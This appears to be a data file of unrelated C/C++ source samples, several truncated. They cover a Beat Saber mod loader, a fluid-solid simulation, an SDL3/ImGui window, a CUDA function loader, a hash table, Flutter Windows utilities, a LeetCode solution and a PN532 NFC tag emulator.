    "#include \"../shared/_config.h\"\n#include \"UI/CampaignSelectionFlowCoordinator.hpp\"\n#include \"UI/ViewControllers/CampaignSelectionViewController.hpp\"\n#include \"main.hpp\"\n#include \"logging.hpp\"\n\n#include \"custom-types/shared/register.hpp\"\n\n#include \"lapiz/shared/zenject/Zenjector.hpp\"\n#include \"lapiz/shared/zenject/Location.hpp\"\n#include \"lapiz/shared/utilities/ZenjectExtensions.hpp\"\n#include \"Zenject/ScopeConcreteIdArgConditionCopyNonLazyBinder.hpp\"\n\n#include \"bsml/shared/BSML.hpp\"\n\nstatic modloader::ModInfo modInfo = {MOD_ID, VERSION, 0}; // Stores the ID and version of our mod, and is sent to the modloader upon startup\n\n// Called at the early stages of game loading\nCUSTOMCAMPAIGNS_EXPORT_FUNC void setup(CModInfo* info) {\n    info->id = MOD_ID;\n    info->version = VERSION;\n;\n    INFO(\"Completed setup!\");\n}\n\n// Called later on in the game loading - a good time to install function hooks\nCUSTOMCAMPAIGNS_EXPORT_FUNC void late_load() {\n    il2cpp_functions::Init();\n\n    custom_types::Register::AutoRegister();\n    BSML::Init();\n\n    auto z = Lapiz::Zenject::Zenjector::Get();\n\n    z->Install(Lapiz::Zenject::Location::App, [](::Zenject::DiContainer* container){\n        \n    });\n\n    z->Install(Lapiz::Zenject::Location::Menu, [](::Zenject::DiContainer* container) {\n        Lapiz::Zenject::ZenjectExtensions::FromNewComponentAsViewController(container->BindInterfacesAndSelfTo<CustomCampaigns::UI::ViewControllers::CampaignSelectionViewController*>())->AsSingle();\n        Lapiz::Zenject::ZenjectExtensions::FromNewComponentOnNewGameObject(container->BindInterfacesAndSelfTo<CustomCampaigns::UI::CampaignSelectionFlowCoordinator*>())->AsSingle();\n    });\n\n    z->Install(Lapiz::Zenject::Location::GameCore, [](::Zenject::DiContainer* container) {\n\n    });\n\n    INFO(\"All tasks completed!\");\n}\n",
    "/************************************************************************\n * MechSys - Open Library for Mechanical Systems                        *\n * Copyright (C) 2020 Sergio Galindo                                    *\n * Copyright (C) 2020 Pei Zhang\n * Copyright (C) 2020 Siqi Sun                                         *\n *                                                                      *\n * This program is free software: you can redistribute it and/or modify *\n * it under the terms of the GNU General Public License as published by *\n * the Free Software Foundation, either version 3 of the License, or    *\n * any later version.                                                   *\n *                                                                      *\n * This program is distributed in the hope that it will be useful,      *\n * but WITHOUT ANY WARRANTY; without even the implied warranty of       *\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the         *\n * GNU General Public License for more details.                         *\n *                                                                      *\n * You should have received a copy of the GNU General Public License    *\n * along with this program. If not, see <http://www.gnu.org/licenses/>  *\n ************************************************************************/\n// Settled cube.\n\n\n// MechSys\n#include <mechsys/lbmmpm/Domain.h>\n#include <math.h>\n#include <iostream>\n#include <fstream>\n\nstruct UserData\n{\n    double                         * Vel;\n    double                           rho;\n    double                          rhof;\n    double                            Tf;\n    double                            Ly;\n    double                            Lz;\n    double                            nu;\n    double                            CD;\n    double                            Re;\n    Vec3_t                    fluidforce;\n    Array<MPM::Particle *>    EndBeamPar;\n    Array<double >                    x0;\n    Array<double >                    x2; \n    std::ofstream                oss_ss1;\n\n};\n\nvoid Setup (LBMMPM::Domain & dom, void * UD)\n{\n    UserData & dat = (*static_cast<UserData *>(UD));\n    #pragma omp parallel for schedule(static) num_threads(dom.Nproc)\n    for (size_t ix=0; ix<dom.LBMDOM.Ndim(0); ++ix)\n    for (size_t iy=0; iy<dom.LBMDOM.Ndim(1); ++iy)\n    for (size_t iz=0; iz<dom.LBMDOM.Ndim(2); ++iz)\n    {\n        dom.LBMDOM.BForce[0][ix][iy][iz] = dom.LBMDOM.Rho[0][ix][iy][iz]*dat.fluidforce;\n    }\n}\n\nvoid Report (LBMMPM::Domain & dom, void * UD)\n{\n    UserData & dat = (*static_cast<UserData *>(UD));\n    if (dom.idx_out==0)\n    {\n        String fs1;\n        fs1.Printf(\"tlbmmpm02.res\");\n        dat.oss_ss1.open(fs1.CStr());\n        dat.oss_ss1 << Util::_10_6 << \"Time\" << Util::_8s << \"Re\" << Util::_8s << \"CD\" << Util::_8s << \"CD(formula)\" << \"\\n\";\n    }\n    else \n    {\n        double x     = 0.0;\n        double z     = 0.0;\n        double xf    = 0.0; // Dx/b\n        double zf    = 0.0; // Dz/b\n        double vel   = 0.0; // velocity of fluid\n        double force = 0.0;\n        int    i     = 0;\n        int    j     = 0;\n\n        // calculate Re \n        for (size_t ix=0; ix<dom.LBMDOM.Ndim(0); ++ix)\n        for (size_t iy=0; iy<dom.LBMDOM.Ndim(1); ++iy)\n        for (size_t iz=0; iz<dom.LBMDOM.Ndim(2); ++iz)\n        {\n            vel += dom.LBMDOM.Vel[0][ix][iy][iz](0);\n            i = i+1;\n        }\n        vel /= i;\n        double Re   = 1.2407*vel*dat.Ly/dat.nu;\n        double CD1  = 128*pow(Re,-0.8)/5.5;\n\n        // calculate CD\n        for (size_t ip=0; ip < dom.MPMDOM.Corners.Size(); ip++)\n        {\n            force = force + dom.MPMDOM.Corners[ip]->h(0);\n        }\n        double CD = force/(0.5*dat.rhof*vel*vel*dat.Ly*dat.Lz*1.2090);\n        dat.oss_ss1 << Util::_10_6 << dom.Time << Util::_8s << Re << Util::_8s << CD << Util::_8s << CD1 << \"\\n\";\n    }\n}\n\nint main(int argc, char **argv) try\n{\n    //Number of cores\n    if (argc<2) throw new Fatal(\"This program must be called with one argument: the name of the data input file without the '.inp' suffix.\\nExample:\\t %s filekey\\n\",argv[0]);\n    size_t Nproc = 1; \n    if (argc>=3) Nproc=atoi(argv[2]);\n    String filekey  (argv[1]);\n    String filename (filekey+\".inp\");\n    if (!Util::FileExists(filename)) throw new Fatal(\"File <%s> not found\",filename.CStr());\n    ifstream infile(filename.CStr());\n    double bforce;\n    {\n        infile >> bforce;           infile.ignore(200,'\\n');\n    }\n    size_t nx = 241;\n    size_t ny = 61;\n    size_t nz = 61;\n    double dx = 0.1;\n    double rhof = 1000.0; // density of fluid\n\n    //Properties of MPM\n    size_t ndiv = 1; //number of divisions per x lenght\n    double K    = 10.0e4; //Bulk modulus\n    double Nu   = 0.3; //Poisson ratio\n    double  E   = (3.0*(1.0-2.0*Nu))*K; //Young modulus\n    double  G   = E/(2.0*(1.0+Nu)); //Shear modulus\n    double rho  = 694.95; //density of solid\n    double Lx   = 14.5*dx; //length of the beam in x   \n  ",
    "#include \"Window.hpp\"\n\n#include <SDL3/SDL.h>\n#include <backends/imgui_impl_opengl3.h>\n#include <backends/imgui_impl_sdl3.h>\n#include <glad/glad.h>\n\n#include \"Core/DPIHandler.hpp\"\n#include \"Core/Debug/Instrumentor.hpp\"\n#include \"Core/Log.hpp\"\n\nnamespace App {\n\nWindow::Window(const Settings& settings)\n    : m_settings(DPIHandler::get_dpi_aware_window_size(settings)) {\n  APP_PROFILE_FUNCTION();\n\n  // Create window with graphics context\n  SDL_GL_SetAttribute(SDL_GL_DOUBLEBUFFER, 1);\n  SDL_GL_SetAttribute(SDL_GL_DEPTH_SIZE, 24);\n  SDL_GL_SetAttribute(SDL_GL_STENCIL_SIZE, 8);\n\n  m_window = SDL_CreateWindow(settings.title.c_str(),\n      m_settings.width,\n      m_settings.height,\n      SDL_WINDOW_OPENGL | SDL_WINDOW_RESIZABLE | SDL_WINDOW_HIGH_PIXEL_DENSITY);\n\n  // NOLINTNEXTLINE\n  m_gl_context = SDL_GL_CreateContext(m_window);\n  if (m_gl_context == nullptr) {\n    APP_ERROR(\"Could not create SDL OpenGL context.\");\n    return;\n  }\n\n  SDL_SetWindowPosition(m_window, SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED);\n  gladLoadGLLoader(reinterpret_cast<GLADloadproc>(SDL_GL_GetProcAddress));\n  SDL_GL_MakeCurrent(m_window, m_gl_context);\n  SDL_GL_SetSwapInterval(1);  // Enable vsync\n\n  // Setup Dear ImGui context\n  IMGUI_CHECKVERSION();\n  ImGui::CreateContext();\n  ImGuiIO& io{ImGui::GetIO()};\n\n  io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard | ImGuiConfigFlags_DockingEnable |\n                    ImGuiConfigFlags_ViewportsEnable;\n\n  // @info: https://github.com/ocornut/imgui/issues/2361\n  io.ConfigDockingTransparentPayload = true;\n\n  // Absolute imgui.ini path to preserve settings independent of app location.\n  static const std::string imgui_ini_filename{m_user_config_path.generic_string() + \"imgui.ini\"};\n  io.IniFilename = imgui_ini_filename.c_str();\n\n  // ImGUI font\n  const float font_scaling_factor{SDL_GetWindowDisplayScale(m_window)};\n  const float font_size{18.0F * font_scaling_factor};\n  const std::string font_path{Resources::font_path(\"Manrope.ttf\").generic_string()};\n\n  io.Fonts->AddFontFromFileTTF(font_path.c_str(), font_size);\n  io.FontDefault = io.Fonts->AddFontFromFileTTF(font_path.c_str(), font_size);\n  io.FontGlobalScale = 1.0F / font_scaling_factor;\n\n  // Setup Platform/Renderer backends\n  ImGui_ImplSDL3_InitForOpenGL(m_window, m_gl_context);\n  ImGui_ImplOpenGL3_Init(\"#version 410 core\");\n}\n\nWindow::~Window() {\n  APP_PROFILE_FUNCTION();\n\n  SDL_GL_DeleteContext(m_gl_context);\n  SDL_DestroyWindow(m_window);\n\n  ImGui_ImplOpenGL3_Shutdown();\n  ImGui_ImplSDL3_Shutdown();\n  ImGui::DestroyContext();\n}\n\nvoid Window::update() {\n  APP_PROFILE_FUNCTION();\n\n  // Start the Dear ImGui frame\n  ImGui_ImplOpenGL3_NewFrame();\n  ImGui_ImplSDL3_NewFrame();\n  ImGui::NewFrame();\n\n  const ImGuiIO& io{ImGui::GetIO()};\n\n  if (!m_minimized) {\n    ImGui::DockSpaceOverViewport();\n\n    if (ImGui::BeginMainMenuBar()) {\n      if (ImGui::BeginMenu(\"File\")) {\n        if (ImGui::MenuItem(\"Exit\", \"Cmd+Q\")) {\n          on_close();\n        }\n        ImGui::EndMenu();\n      }\n      if (ImGui::BeginMenu(\"View\")) {\n        ImGui::MenuItem(\"Some Panel\", nullptr, &m_show_some_panel);\n        ImGui::MenuItem(\"ImGui Demo Panel\", nullptr, &m_show_demo_panel);\n        ImGui::MenuItem(\"Debug Panel\", nullptr, &m_show_debug_panel);\n        ImGui::EndMenu();\n      }\n\n      ImGui::EndMainMenuBar();\n    }\n\n    // Whatever GUI to implement here ...\n    if (m_show_some_panel) {\n      ImGui::Begin(\"Some panel\", &m_show_some_panel);\n      ImGui::Text(\"Hello World\");\n      ImGui::End();\n    }\n\n    // ImGUI demo panel\n    if (m_show_demo_panel) {\n      ImGui::ShowDemoWindow(&m_show_demo_panel);\n    }\n\n    // Debug panel\n    if (m_show_debug_panel) {\n      ImGui::Begin(\"Debug panel\", &m_show_debug_panel);\n      ImGui::Text(\"User config path: %s\", m_user_config_path.c_str());\n      ImGui::Text(\"Global font scaling %f\", io.FontGlobalScale);\n      ImGui::End();\n    }\n  }\n\n  // Rendering\n  ImGui::Render();\n\n  glViewport(0, 0, static_cast<int>(io.DisplaySize.x), static_cast<int>(io.DisplaySize.y));\n  glClearColor(0.5F, 0.5F, 0.5F, 1.00F);\n  glClear(GL_COLOR_BUFFER_BIT);\n  ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());\n\n  if ((io.ConfigFlags & ImGuiConfigFlags_ViewportsEnable) != 0) {\n    SDL_Window* backup_current_window{SDL_GL_GetCurrentWindow()};\n    SDL_GLContext backup_current_context{SDL_GL_GetCurrentContext()};\n    ImGui::UpdatePlatformWindows();\n    ImGui::RenderPlatformWindowsDefault();\n    SDL_GL_MakeCurrent(backup_current_window, backup_current_context);\n  }\n\n  SDL_GL_SwapWindow(m_window);\n}\n\nvoid Window::on_minimize() {\n  APP_PROFILE_FUNCTION();\n\n  m_minimized = true;\n}\n\nvoid Window::on_shown() {\n  APP_PROFILE_FUNCTION();\n\n  m_minimized = false;\n}\n\nvoid Window::on_close() {\n  APP_PROFILE_FUNCTION();\n\n  SDL_Event window_close_event;\n  window_close_event.type = SDL_EVENT_QUIT;\n  SDL_PushEvent(&window_close_event);\n}\n\nvoid Window::on_event(const SDL_WindowEvent& event) {\n  APP_PROFILE_FUNCTION();\n\n  switch (event.type) {\n    case SDL_EVENT_WINDOW_C",
    "// MIT License\n// \n// Copyright (C) 2018-2024, Tellusim Technologies Inc. https://tellusim.com/\n// \n// Permission is hereby granted, free of charge, to any person obtaining a copy\n// of this software and associated documentation files (the \"Software\"), to deal\n// in the Software without restriction, including without limitation the rights\n// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n// copies of the Software, and to permit persons to whom the Software is\n// furnished to do so, subject to the following conditions:\n// \n// The above copyright notice and this permission notice shall be included in all\n// copies or substantial portions of the Software.\n// \n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n// SOFTWARE.\n\n#include <core/TellusimLog.h>\n#include <platform/TellusimContext.h>\n\n#include \"../include/TellusimCU.h\"\n\n/*\n */\nnamespace Tellusim {\n\t\n\t/*\n\t */\n\tnamespace CU {\n\t\t\n\t\t/*\n\t\t */\n\t\tbool init() {\n\t\t\t\n\t\t\t// function address\n\t\t\t#define GET_ADDRESS(TYPE, NAME) { \\\n\t\t\t\tNAME = (TYPE)CUContext::getProcAddress(#NAME); \\\n\t\t\t\tif(NAME == nullptr && is_core) { \\\n\t\t\t\t\tTS_LOGF(Error, \"CU::init(): can't get %s function\\n\", #NAME); \\\n\t\t\t\t\treturn false; \\\n\t\t\t\t} \\\n\t\t\t}\n\t\t\t\n\t\t\t// core functions\n\t\t\tbool is_core = true;\n\t\t\t\n\t\t\t// Cuda functions\n\t\t\tGET_ADDRESS(PFN_cuGetErrorString, cuGetErrorString)\n\t\t\tGET_ADDRESS(PFN_cuGetErrorName, cuGetErrorName)\n\t\t\tGET_ADDRESS(PFN_cuInit, cuInit)\n\t\t\tGET_ADDRESS(PFN_cuDriverGetVersion, cuDriverGetVersion)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGet, cuDeviceGet)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetCount, cuDeviceGetCount)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetName, cuDeviceGetName)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetUuid, cuDeviceGetUuid)\n\t\t\tGET_ADDRESS(PFN_cuDeviceTotalMem, cuDeviceTotalMem)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetAttribute, cuDeviceGetAttribute)\n\t\t\tGET_ADDRESS(PFN_cuDevicePrimaryCtxRetain, cuDevicePrimaryCtxRetain)\n\t\t\tGET_ADDRESS(PFN_cuDevicePrimaryCtxRelease, cuDevicePrimaryCtxRelease)\n\t\t\tGET_ADDRESS(PFN_cuDevicePrimaryCtxSetFlags, cuDevicePrimaryCtxSetFlags)\n\t\t\tGET_ADDRESS(PFN_cuDevicePrimaryCtxGetState, cuDevicePrimaryCtxGetState)\n\t\t\tGET_ADDRESS(PFN_cuDevicePrimaryCtxReset, cuDevicePrimaryCtxReset)\n\t\t\tGET_ADDRESS(PFN_cuCtxCreate, cuCtxCreate)\n\t\t\tGET_ADDRESS(PFN_cuCtxDestroy, cuCtxDestroy)\n\t\t\tGET_ADDRESS(PFN_cuCtxPushCurrent, cuCtxPushCurrent)\n\t\t\tGET_ADDRESS(PFN_cuCtxPopCurrent, cuCtxPopCurrent)\n\t\t\tGET_ADDRESS(PFN_cuCtxSetCurrent, cuCtxSetCurrent)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetCurrent, cuCtxGetCurrent)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetDevice, cuCtxGetDevice)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetFlags, cuCtxGetFlags)\n\t\t\tGET_ADDRESS(PFN_cuCtxSynchronize, cuCtxSynchronize)\n\t\t\tGET_ADDRESS(PFN_cuCtxSetLimit, cuCtxSetLimit)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetLimit, cuCtxGetLimit)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetCacheConfig, cuCtxGetCacheConfig)\n\t\t\tGET_ADDRESS(PFN_cuCtxSetCacheConfig, cuCtxSetCacheConfig)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetSharedMemConfig, cuCtxGetSharedMemConfig)\n\t\t\tGET_ADDRESS(PFN_cuCtxSetSharedMemConfig, cuCtxSetSharedMemConfig)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetApiVersion, cuCtxGetApiVersion)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetStreamPriorityRange, cuCtxGetStreamPriorityRange)\n\t\t\tGET_ADDRESS(PFN_cuModuleLoad, cuModuleLoad)\n\t\t\tGET_ADDRESS(PFN_cuModuleLoadData, cuModuleLoadData)\n\t\t\tGET_ADDRESS(PFN_cuModuleLoadDataEx, cuModuleLoadDataEx)\n\t\t\tGET_ADDRESS(PFN_cuModuleLoadFatBinary, cuModuleLoadFatBinary)\n\t\t\tGET_ADDRESS(PFN_cuModuleUnload, cuModuleUnload)\n\t\t\tGET_ADDRESS(PFN_cuModuleGetFunction, cuModuleGetFunction)\n\t\t\tGET_ADDRESS(PFN_cuModuleGetGlobal, cuModuleGetGlobal)\n\t\t\tGET_ADDRESS(PFN_cuModuleGetTexRef, cuModuleGetTexRef)\n\t\t\tGET_ADDRESS(PFN_cuModuleGetSurfRef, cuModuleGetSurfRef)\n\t\t\tGET_ADDRESS(PFN_cuLinkCreate, cuLinkCreate)\n\t\t\tGET_ADDRESS(PFN_cuLinkAddData, cuLinkAddData)\n\t\t\tGET_ADDRESS(PFN_cuLinkAddFile, cuLinkAddFile)\n\t\t\tGET_ADDRESS(PFN_cuLinkComplete, cuLinkComplete)\n\t\t\tGET_ADDRESS(PFN_cuLinkDestroy, cuLinkDestroy)\n\t\t\tGET_ADDRESS(PFN_cuMemGetInfo, cuMemGetInfo)\n\t\t\tGET_ADDRESS(PFN_cuMemAlloc, cuMemAlloc)\n\t\t\tGET_ADDRESS(PFN_cuMemAllocPitch, cuMemAllocPitch)\n\t\t\tGET_ADDRESS(PFN_cuMemFree, cuMemFree)\n\t\t\tGET_ADDRESS(PFN_cuMemGetAddressRange, cuMemGetAddressRange)\n\t\t\tGET_ADDRESS(PFN_cuMemAllocHost, cuMemAllocHost)\n\t\t\tGET_ADDRESS(PFN_cuMemFreeHost, cuMemFreeHost)\n\t\t\tGET_ADDRESS(PFN_cuMemHostAlloc, cuMemHostAlloc)\n\t\t\tGET_ADDRESS(PFN_cuMemHostGetDevicePointer, cuMemHostGetDevicePointer)\n\t\t\tGET_ADDRESS(PFN_cuMemHostGetFlags, cuMemHostGetFlags)\n\t\t\tGET_ADDRESS(PFN_cuMemAllocManaged, cuMemAllocManaged)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetByPCIBusId, cuDeviceGetByPCIBusId)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetPCIBusId, cuDeviceGetP",
    "#include \"hashtable.h\"\n#include \"utils.h\"\n\nstatic inline int InlineAsmStrcmp (const char str1[WORD_LEN], const char str2[WORD_LEN]);\n\nHashTable* HashTableCtor (size_t hash_t_size, uint32_t (*hash_function) (const char*, size_t))\n{\n    HashTable* hash_t = (HashTable*) calloc (1, sizeof (HashTable));\n    hash_t->content = (List*) calloc (hash_t_size, sizeof (List));\n    hash_t->hash_function = hash_function;\n    hash_t->size = hash_t_size;\n\n    for (size_t i = 0; i < hash_t_size; i++)\n        ListCtor (&hash_t->content[i], MIN_CAPACITY);\n\n    return hash_t;\n}\n\nbool SearchElemHT (HashTable* hash_t, const char* word, size_t len)\n{\n    assert (hash_t);\n    assert (word);\n\n    uint32_t hash_value = HashFunction (hash_t, word, len) % hash_t->size;\n\n    return (bool) CheckRepeat (&hash_t->content[hash_value], word);\n}\n\nint CheckRepeat (List* list, const char* word)\n{\n    assert (list);\n    assert (word);\n\n    Node* nodes_array = list->nodes;\n    int cur_node_index = list->head;\n\n    while (cur_node_index != 0)\n    {\n        Node cur_node = nodes_array[cur_node_index];\n\n        if (InlineAsmStrcmp (word, cur_node.value) == -1) return cur_node_index;\n        cur_node_index = cur_node.next;\n    }\n\n    return 0;\n}\n\nvoid HashTableDtor (HashTable* hash_t)\n{\n    assert (hash_t);\n\n    for (size_t i = 0; i < hash_t->size; i++)\n        ListDtor (&hash_t->content[i]);\n\n    FREE (hash_t->content);\n\n    hash_t->hash_function = nullptr;\n    hash_t->size = 0;\n\n    FREE (hash_t);\n}\n\nvoid FillHashTable (HashTable* hash_t, Text* text)\n{\n    assert (hash_t);\n    assert (filename);\n\n    size_t words_num = text->nlines;\n    char* buffer = text->buffer;\n\n    for (size_t i = 0; i < words_num; ++i)\n    {\n        InsertValue (hash_t, buffer, text->words_len[i]);\n        buffer += WORD_LEN;\n    }\n}\n\nvoid InsertValue (HashTable* hash_t, const char* word, size_t len)\n{\n    assert (hash_t);\n    assert (word);\n\n    uint32_t hash_value = HashFunction (hash_t, word, len) % hash_t->size;\n\n    List* cur_list = &hash_t->content[hash_value];\n    if (CheckRepeat (cur_list, word)) return;\n\n    InsertTail (cur_list, word);\n}\n\n\nvoid DeleteValue (HashTable* hash_t, const char* word, size_t len)\n{\n    assert (hash_t);\n    assert (word);\n\n    uint32_t hash_value = HashFunction (hash_t, word, len) % hash_t->size;\n    List* cur_list = &hash_t->content[hash_value];\n\n    int position = CheckRepeat (cur_list, word);\n    if (position) ListDelete (cur_list, position);\n}\n\nstatic inline int InlineAsmStrcmp (const char str1[WORD_LEN], const char str2[WORD_LEN])\n{\n    assert (str1);\n    assert (str2);\n\n    int res = 0;\n\n    asm (\".intel_syntax noprefix\\n\"\n         \"vmovdqa ymm1, YMMWORD PTR [%1]\\n\"\n         \"vpcmpeqb ymm0, ymm1, YMMWORD PTR [%2]\\n\"\n         \"vpmovmskb %0, ymm0\\n\"\n         \".att_syntax prefix\\n\"\n         : \"=r\" (res) : \"r\" (str1), \"r\" (str2) : \"ymm0\", \"ymm1\", \"cc\");\n\n    return res;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "//\n// Created by VhahahaV on 2024/5/8.\n//\n#include \"bits/stdc++.h\"\nusing namespace std;\n//37min\n#include \"bits/stdc++.h\"\nusing namespace std;\nclass Solution {\npublic:\n// F[i][j] = max(F[i+1][j].max-F[i+1][j].min , a[i] - F[i+1][j].min ,\n//                  F[i][j-1].max-F[i][j-1].min , F[i][j-1].max-a[j-1],)\n    int maxProfit(vector<int>& prices) {\n        // using date = pair<int,int>;\n        // int n = prices.size();\n        // vector<vector<date>> F(n,vector<date>(n));\n        // for(int i = 0 ;i < n ; i++)\n        //     F[i][i].first = prices[i] , F[i][i].second = prices[i];\n        // // ((n-1)-0)\n        // for(int interval = 1; interval <= n-1;interval++)\n        //     for(int start = 0; start+interval<=n-1;start++){\n        //         int end = start+interval;\n        //         auto &_f = F[start+1][end], &__f = F[start][end-1];\n        //         auto &f =  F[start][end];\n        //         f.first = min(_f.first,prices[start]);\n        //         f.second = max(__f.second,prices[end]);\n        //     }\n        // return (F[0][n-1].second - F[0][n-1].first);\n        int minPrice = 1e9,maxPro = 0;\n        for(auto p : prices){\n            maxPro = max(maxPro,p - minPrice);\n            minPrice = min(p,minPrice);\n        }\n        return maxPro;\n    }\n};",
    "/**************************************************************************/\n/*!\n    @file     emulatetag.cpp\n    @author   Armin Wieser\n    @license  BSD\n*/\n/**************************************************************************/\n\n#include \"emulatetag.h\"\n#include \"PN532_debug.h\"\n\n#include <string.h>\n\n#define MAX_TGREAD\n\n\n// Command APDU\n#define C_APDU_CLA   0\n#define C_APDU_INS   1 // instruction\n#define C_APDU_P1    2 // parameter 1\n#define C_APDU_P2    3 // parameter 2\n#define C_APDU_LC    4 // length command\n#define C_APDU_DATA  5 // data\n\n#define C_APDU_P1_SELECT_BY_ID   0x00\n#define C_APDU_P1_SELECT_BY_NAME 0x04\n\n// Response APDU\n#define R_APDU_SW1_COMMAND_COMPLETE 0x90 \n#define R_APDU_SW2_COMMAND_COMPLETE 0x00 \n\n#define R_APDU_SW1_NDEF_TAG_NOT_FOUND 0x6a\n#define R_APDU_SW2_NDEF_TAG_NOT_FOUND 0x82\n\n#define R_APDU_SW1_FUNCTION_NOT_SUPPORTED 0x6A\n#define R_APDU_SW2_FUNCTION_NOT_SUPPORTED 0x81\n\n#define R_APDU_SW1_MEMORY_FAILURE 0x65\n#define R_APDU_SW2_MEMORY_FAILURE 0x81\n\n#define R_APDU_SW1_END_OF_FILE_BEFORE_REACHED_LE_BYTES 0x62\n#define R_APDU_SW2_END_OF_FILE_BEFORE_REACHED_LE_BYTES 0x82\n\n// ISO7816-4 commands\n#define ISO7816_SELECT_FILE 0xA4\n#define ISO7816_READ_BINARY 0xB0\n#define ISO7816_UPDATE_BINARY 0xD6\n\ntypedef enum { NONE, CC, NDEF } tag_file;   // CC ... Compatibility Container\n\nbool EmulateTag::init(){\n  pn532.begin();\n  return pn532.SAMConfig();\n}\n\nvoid EmulateTag::setNdefFile(const uint8_t* ndef, const int16_t ndefLength){\n  if(ndefLength >  (NDEF_MAX_LENGTH -2)){\n\tDMSG(\"ndef file too large (> NDEF_MAX_LENGHT -2) - aborting\");\n\treturn;\n  }\n\n  ndef_file[0] = ndefLength >> 8;\n  ndef_file[1] = ndefLength & 0xFF;\n  memcpy(ndef_file+2, ndef, ndefLength);\n}\n\nvoid EmulateTag::setUid(uint8_t* uid){\n  uidPtr = uid;\n}\n\nbool EmulateTag::emulate(const uint16_t tgInitAsTargetTimeout){\n\n  uint8_t command[] = {\n        PN532_COMMAND_TGINITASTARGET,\n        5,                  // MODE: PICC only, Passive only\n\n        0x04, 0x00,         // SENS_RES\n        0x00, 0x00, 0x00,   // NFCID1\n        0x20,               // SEL_RES\n\n        0,0,0,0,0,0,0,0,\n        0,0,0,0,0,0,0,0,   // FeliCaParams\n        0,0,\n\n        0,0,0,0,0,0,0,0,0,0, // NFCID3t\n\n        0, // length of general bytes\n        0  // length of historical bytes\n  };\n\n  if(uidPtr != 0){  // if uid is set copy 3 bytes to nfcid1\n    memcpy(command + 4, uidPtr, 3);\n  }\n\n  if(1 != pn532.tgInitAsTarget(command,sizeof(command), tgInitAsTargetTimeout)){\n    DMSG(\"tgInitAsTarget failed or timed out!\");\n    return false;\n  }\n\n  uint8_t compatibility_container[] = {\n    0, 0x0F,\n    0x20,\n    0, 0x54,\n    0, 0xFF,\n    0x04,       // T\n    0x06,       // L\n    0xE1, 0x04, // File identifier\n    ((NDEF_MAX_LENGTH & 0xFF00) >> 8), (NDEF_MAX_LENGTH & 0xFF), // maximum NDEF file size\n    0x00,       // read access 0x0 = granted\n    0x00        // write access 0x0 = granted | 0xFF = deny\n  };\n\n  if(tagWriteable == false){\n    compatibility_container[14] = 0xFF;\n  }\n\n  tagWrittenByInitiator = false;\n\n  uint8_t rwbuf[128];\n  uint8_t sendlen;\n  int16_t status;\n  tag_file currentFile = NONE;\n  uint16_t cc_size = sizeof(compatibility_container);\n  bool runLoop = true;\n\n  while(runLoop){\n    status = pn532.tgGetData(rwbuf, sizeof(rwbuf));\n    if(status < 0){\n      DMSG(\"tgGetData failed!\\n\");\n      pn532.inRelease();\n      return true;\n    }\n\n    uint8_t p1 = rwbuf[C_APDU_P1];\n    uint8_t p2 = rwbuf[C_APDU_P2];\n    uint8_t lc = rwbuf[C_APDU_LC];\n    